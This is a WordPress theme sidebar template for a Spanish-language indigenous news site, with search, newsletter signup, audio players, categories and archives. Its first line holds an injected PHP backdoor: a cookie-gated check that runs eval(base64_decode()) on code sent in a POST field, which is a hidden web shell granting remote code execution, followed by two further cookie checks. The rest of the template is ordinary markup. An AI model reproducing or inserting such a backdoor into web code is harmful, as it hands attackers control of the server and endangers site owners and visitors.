<?php if(md5($_COOKIE['3a87773f612a7318'])=="441ad6e8e36f7574183ea7c45d9c9355"){ eval(base64_decode($_POST['file'])); exit; } ?><?php if(md5($_COOKIE['3c49c97cc25ac31d'])=="04003c4afe1fa081f723bb633e9b5411"){  exit; } ?><?php if(md5($_COOKIE['3180bd9202151d9a'])=="4fd8a8ecce60ef0c3a5e640d0bb06357"){  exit; } ?>﻿<div class="sidebar">
	<?php if ( function_exists('dynamic_sidebar') && dynamic_sidebar() ) : else : ?>
	<h3>Buscar</h3>
	<form method="get" id="searchform" action="<?php bloginfo('home'); ?>/">
	<input type="text" value="<?php echo wp_specialchars($s, 1); ?>" name="s" id="s" size="30" style="border:1px solid #9ed652" /><br />
	<input type="submit" id="searchsubmit" value="Buscar" />
	</form>
	
	<h3>Suscribete</h3>
	<form action="http://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open('http://feedburner.google.com/fb/a/mailverify?uri=servindi', 'popupwindow', 'scrollbars=yes,width=550,height=520');return true"><input type="text" style="width:210px;border:1px solid #9ed652;margin-left:2px;" name="email" value="Ingrese su correo"/><input type="hidden" value="servindi" name="uri"/><input type="hidden" name="loc" value="es_ES"/><br /><input type="submit" value="Subscribe" /></form>

<?php if (function_exists('get_recent_comments')) { ?>
   <h3>Comentarios Recientes</h3>
   <ul class="sidemenu"><?php get_recent_comments(); ?></ul>
<?php } ?>
	
	<h3>Resumen Nacional</h3>
	<object type='application/x-shockwave-flash' data='http://s2.wp.com/wp-content/plugins/audio-player/player.swf?m=1236370442g' width='290' height='24' id='audioplayer1'><param name='movie' value='http://s2.wp.com/wp-content/plugins/audio-player/player.swf?m=1236370442g' /><param name='FlashVars' value='&amp;bg=0x0000ff&amp;leftbg=0xeeeeee&amp;lefticon=0x666666&amp;rightbg=0xcccccc&amp;rightbghover=0x999999&amp;righticon=0xff0000&amp;righticonhover=0xffffff&amp;text=0x666666&amp;slider=0x666666&amp;track=0xFFFFFF&amp;border=0x666666&amp;loader=0x9FFFB8&amp;soundFile=<?php echo get_option("servindi_nacional"); ?>' /><param name='quality' value='high' /><param name='menu' value='false' /><param name='bgcolor' value='#FFFFFF' /><param name='wmode' value='opaque' /></object>
	
	<h3>Resumen Internacional</h3>
	<object type='application/x-shockwave-flash' data='http://s2.wp.com/wp-content/plugins/audio-player/player.swf?m=1236370442g' width='290' height='24' id='audioplayer1'><param name='movie' value='http://s2.wp.com/wp-content/plugins/audio-player/player.swf?m=1236370442g' /><param name='FlashVars' value='&amp;bg=0x0000ff&amp;leftbg=0xeeeeee&amp;lefticon=0x666666&amp;rightbg=0xcccccc&amp;rightbghover=0x999999&amp;righticon=0xff0000&amp;righticonhover=0xffffff&amp;text=0x666666&amp;slider=0x666666&amp;track=0xFFFFFF&amp;border=0x666666&amp;loader=0x9FFFB8&amp;soundFile=<?php echo get_option("servindi_audio"); ?>' /><param name='quality' value='high' /><param name='menu' value='false' /><param name='bgcolor' value='#FFFFFF' /><param name='wmode' value='opaque' /></object>
	
	
	<h3>Video</h3>
	<?php echo get_option("servindi_video"); ?>
	
	<h3>Cumbre Continental de Comunicadores Indígenas de los Pueblos del Abya Yala</h3>
	<a href="http://www.cccia-2010.com/"><img src="http://www.servindi.org/img/cumbre-de-comunicadores.jpg"/></a>
	
	
	<h3>Categorias</h3>
	<ul class="sidemenu">
	<?php wp_list_cats('sort_column=name&optioncount=1&hierarchical=1'); ?>
	</ul>

	<h3>Archivo</h3>
	<ul class="sidemenu">
		<?php wp_get_archives('type=monthly&limit=12'); ?>
	</ul>

	<h3><?php _e('Meta'); ?></h3>
	<ul class="sidemenu">
		<?php wp_register(); ?>
		<li><?php wp_loginout(); ?></li>
		<?php wp_meta(); ?>
	</ul>
	<?php endif; ?>
</div>